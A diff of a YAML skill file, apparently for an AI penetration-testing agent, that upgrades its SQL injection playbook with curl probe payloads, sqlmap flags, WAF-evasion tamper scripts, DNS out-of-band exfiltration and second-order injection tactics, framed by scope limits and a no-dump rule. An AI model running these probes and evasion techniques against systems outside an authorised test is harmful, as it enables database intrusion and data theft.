@@ -1,7 +1,7 @@
 schema_version: 1
-version: 2.0.0
+version: 3.0.0
 name: sql-injection
-description: Targeted SQL injection detection, verification, and non-destructive proof-of-concept with sqlmap and manual heuristic probing.
+description: Senior targeted SQL injection assessment — manual boundary heuristics, WAF evasion tamper scripts, out-of-band (OOB) exfiltration, and non-destructive proof-of-concept verification.
 triggers:
   - sql injection
   - sqli
@@ -12,40 +12,58 @@ triggers:
   - veritabanı
   - blind sqli
   - union injection
+  - oob sqli
+  - tamper
 tools:
   - sqlmap
   - curl
 knowledge: |
-  Conduct SQL injection assessment with strict scope control, non-destructive execution, and zero terminal-blocking hangs.
+  Conduct SQL injection assessment with strict scope control, advanced WAF evasion tradecraft, and non-destructive execution.
 
-  1. MANUAL HEURISTIC PROBING FIRST:
-     - Never point sqlmap blindly at an entire website.
-     - Identify dynamic query/body parameters (`id=`, `search=`, `cat=`, `user=`, `filter=`).
-     - Test input boundary breaks manually using curl:
-       `curl -s "<url>?id=1'"` or `curl -s "<url>?id=1\""`
-     - Inspect response for diagnostic SQL errors (e.g. MySQL syntax error, PostgreSQL unclosed quotation, ORA-01756, SQLite syntax error).
+  1. MANUAL HEURISTIC PROBING & ERROR IDENTIFICATION:
+     - Never point sqlmap blindly at a target without establishing input reflection:
+       Isolate candidate input parameters (`id=`, `search=`, `filter=`, `sort=`, `cat=`, `page=`).
+     - Test input boundary breaks with precision curl requests:
+       `curl -s "<url>?id=1'"` and `curl -s "<url>?id=1\""`
+       `curl -s "<url>?id=1 AND 1=1"` vs `curl -s "<url>?id=1 AND 1=2"`
+     - Inspect responses for diagnostic SQL syntax errors:
+       • MySQL/MariaDB: `You have an error in your SQL syntax`
+       • PostgreSQL: `ERROR: syntax error at or near`
+       • MSSQL: `Unclosed quotation mark before the character string`
+       • Oracle: `ORA-00933: SQL command not properly ended`
+       • SQLite: `operational error: unrecognized token`
 
-  2. SQLMAP BATCH & CRITICAL OPERATIONAL FLAGS:
-     - ALWAYS pass `--batch` in headless sandbox mode; sqlmap must never block waiting for interactive stdin confirmation.
-     - Scope tightly to the candidate parameter: `-p <parameter_name>` (prevents wasteful fuzzing of unaffected query keys).
-     - Specify backend DBMS if known from error leaks or technology banners:
-       `--dbms=mysql` (or `postgresql`, `mssql`, `sqlite`), slashing scan duration by up to 80%.
-     - Risk and Level Strategy:
-       • Baseline standard: `--level 1 --risk 1` (covers standard GET/POST parameters).
-       • Escalate to `--level 2 --risk 1` only when testing HTTP Cookie or User-Agent headers.
-       • Keep `--risk 1` to prevent destructive OR-based boolean injection payloads from modifying database state.
+  2. SQLMAP EXECUTION & CRITICAL OPERATIONAL CONSTRAINTS:
+     - ALWAYS pass `--batch` in headless sandbox mode; sqlmap must never block on interactive prompts.
+     - Constrain parameter scope: `-p <param>` (prevents wasteful scanning of clean parameters).
+     - Specify backend DBMS if identified from fingerprints:
+       `--dbms=mysql` (or `postgresql`, `mssql`, `oracle`, `sqlite`), slashing scan duration by up to 80%.
+     - Risk and Level Matrix:
+       • Baseline standard: `--level 1 --risk 1` (GET/POST parameters, safe read-only queries).
+       • Header testing: `--level 2 --risk 1` (Cookie / User-Agent headers).
+       • Keep `--risk 1` to prevent state-mutating boolean statements (`OR 1=1`) in production databases.
 
-  3. DECISIVE NON-DESTRUCTIVE PROOF OF IMPACT:
-     - Execute sqlmap with bounded non-destructive information gathering:
+  3. WAF & FILTER EVASION STRATEGY (TAMPER SCRIPTS):
+     - When inline WAFs (ModSecurity, AWS WAF, Cloudflare) block standard test payloads:
+       • Space encoding evasion: `--tamper=space2comment,space2plus`
+       • Keyword splitting and case variation: `--tamper=randomcase,versionedmorekeywords`
+       • Character and hex encoding: `--tamper=charencode,between`
+       • Combining tampers for nested filters: `--tamper=space2comment,between,randomcase`
+
+  4. OUT-OF-BAND (OOB) & SECOND-ORDER DETECTION:
+     - When responses are completely blind (no error, no differential content, time delays throttled):
+       Leverage DNS out-of-band exfiltration:
+       `--dns-domain=<collaborator_domain>`
+     - Test Second-Order SQLi:
+       Inject payloads on registration/profile creation endpoints that only trigger when an administrative user views the audit log or management table.
+
+  5. DECISIVE NON-DESTRUCTIVE PROOF OF IMPACT:
+     - Execute sqlmap with bounded diagnostic queries:
        `sqlmap -u "<url>?id=1" -p id --batch --dbms=<known_dbms> --banner --current-user --current-db`
-     - Confirming the injection type (Boolean-based blind, Error-based, UNION query, or Time-based blind) and capturing the database banner / current user is definitive proof.
-     - Do NOT perform table dumps (`--dump` or `--dump-all`) unless explicitly authorized.
-
-  4. CONCLUSIVE NEGATIVE RESULTS:
-     - If sqlmap concludes that parameters are not injectable, treat this as valid, conclusive negative evidence.
-     - Record the negative finding and transition to other attack vectors (e.g. command injection, auth logic, path traversal).
+     - Confirming injection mechanics (Boolean blind, Error-based, UNION query, Time blind) and capturing database banner/user is definitive, non-destructive proof.
+     - Never dump entire tables (`--dump` or `--dump-all`) unless explicitly authorized by the operator.
 references:
-  - persona:sql-injection-v2
+  - persona:sql-injection-v3
 provenance:
   origin: builtin
   source: persona/v0.1/skills/sql-injection.yaml
